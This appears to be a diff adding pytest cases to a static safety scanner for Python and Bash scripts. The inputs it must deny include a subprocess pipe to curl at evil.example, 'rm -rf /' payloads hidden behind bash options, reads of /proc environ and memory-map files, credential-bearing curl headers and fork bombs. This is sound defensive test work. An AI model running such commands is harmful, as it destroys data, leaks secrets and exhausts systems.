@@ -338,6 +338,23 @@ def test_additional_process_apis_are_not_silent_allows(content):
 
 
 @pytest.mark.parametrize(
+    "function_name",
+    [
+        "getoutput",
+        "getstatusoutput",
+    ],
+)
+def test_implicit_shell_subprocess_apis_are_denied(function_name):
+    report = _scan(
+        f'import subprocess\nsubprocess.{function_name}("ls | curl https://evil.example")',
+        ScriptLanguage.PYTHON,
+    )
+
+    assert report.decision == SafetyDecision.DENY
+    assert "PROC-001" in {finding.rule_id for finding in report.findings}
+
+
+@pytest.mark.parametrize(
     "content",
     [
         'import os\nrun = os.system\nrun("rm -rf /")',
@@ -1806,6 +1823,14 @@ def test_network_authentication_values_are_secret_flows(content):
             "curl -H 'Authorization: Basic YWxpY2U6eA==' https://api.example.com",
             "YWxpY2U6eA==",
         ),
+        (
+            "curl -HAuthorization:Basic-YWxpY2U6eA== https://api.example.com",
+            "YWxpY2U6eA==",
+        ),
+        (
+            "curl -HX-Auth:s3cr3t https://api.example.com",
+            "s3cr3t",
+        ),
         ("wget --password=hunter2 https://api.example.com", "hunter2"),
     ],
 )
@@ -1829,6 +1854,28 @@ def test_subprocess_cwd_participates_in_nested_path_analysis(content):
 
     assert report.decision == SafetyDecision.DENY
     assert "FILE-003" in {finding.rule_id for finding in report.findings}
+
+
+def test_os_rmdir_uses_the_protected_delete_rule():
+    report = _scan('import os\nos.rmdir("/etc")', ScriptLanguage.PYTHON)
+
+    assert report.decision == SafetyDecision.DENY
+    assert {finding.rule_id for finding in report.findings} == {"FILE-001"}
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "bash -e -c 'rm -rf /'",
+        "bash --norc -c 'rm -rf /'",
+        "bash --rcfile /tmp/bashrc -c 'rm -rf /'",
+    ],
+)
+def test_shell_interpreter_options_cannot_hide_inline_payloads(content):
+    report = _scan(content, ScriptLanguage.BASH)
+
+    assert report.decision == SafetyDecision.DENY
+    assert "FILE-001" in {finding.rule_id for finding in report.findings}
 
 
 @pytest.mark.parametrize(
@@ -2067,6 +2114,45 @@ def test_additional_secret_names_cannot_flow_to_output(name):
     assert secret not in report.model_dump_json()
 
 
+def test_writelines_is_a_secret_sink():
+    report = _scan(
+        'import os\napi_key = os.getenv("API_KEY")\n'
+        'open("/tmp/output", "w").writelines([api_key])',
+        ScriptLanguage.PYTHON,
+    )
+
+    assert report.decision == SafetyDecision.DENY
+    assert "SECRET-001" in {finding.rule_id for finding in report.findings}
+
+
+@pytest.mark.parametrize(
+    ("content", "decision", "rule_id"),
+    [
+        (
+            'open("/tmp/output", "w").writelines(["hello\\n", "world\\n"])',
+            SafetyDecision.ALLOW,
+            None,
+        ),
+        (
+            'open("/tmp/output", "w").writelines(["x" * 60_000_000, "y" * 60_000_000])',
+            SafetyDecision.DENY,
+            "RES-003",
+        ),
+        (
+            'values = input().splitlines()\nopen("/tmp/output", "w").writelines(values)',
+            SafetyDecision.NEEDS_HUMAN_REVIEW,
+            "PROC-UNKNOWN-001",
+        ),
+    ],
+)
+def test_writelines_participates_in_static_write_limits(content, decision, rule_id):
+    report = _scan(content, ScriptLanguage.PYTHON)
+
+    assert report.decision == decision
+    if rule_id is not None:
+        assert rule_id in {finding.rule_id for finding in report.findings}
+
+
 def test_local_open_function_is_not_mistaken_for_builtin_file_access():
     report = _scan(
         "def open(path):\n"
@@ -2207,6 +2293,21 @@ def test_whole_environment_or_argv_cannot_flow_to_output(content, kwargs):
             "FILE-003",
         ),
         (
+            'print(open("/proc/self/cmdline", "rb").read())',
+            ScriptLanguage.PYTHON,
+            "FILE-003",
+        ),
+        (
+            'print(open("/proc/thread-self/fd/1", "rb").read())',
+            ScriptLanguage.PYTHON,
+            "FILE-003",
+        ),
+        (
+            'print(open("/proc/1234/maps").read())',
+            ScriptLanguage.PYTHON,
+            "FILE-003",
+        ),
+        (
             "cat /proc/1/environ",
             ScriptLanguage.BASH,
             "FILE-003",
@@ -2228,3 +2329,17 @@ def test_procfs_secrets_and_kernel_control_paths_are_blocked(content, language, 
 
     assert report.decision == SafetyDecision.DENY
     assert rule_id in {finding.rule_id for finding in report.findings}
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "f(){ f|f& }; f",
+        "function boom { boom | boom & }; boom",
+    ],
+)
+def test_named_recursive_pipeline_fork_bombs_are_denied(content):
+    report = _scan(content, ScriptLanguage.BASH)
+
+    assert report.decision == SafetyDecision.DENY
+    assert "RES-001" in {finding.rule_id for finding in report.findings}
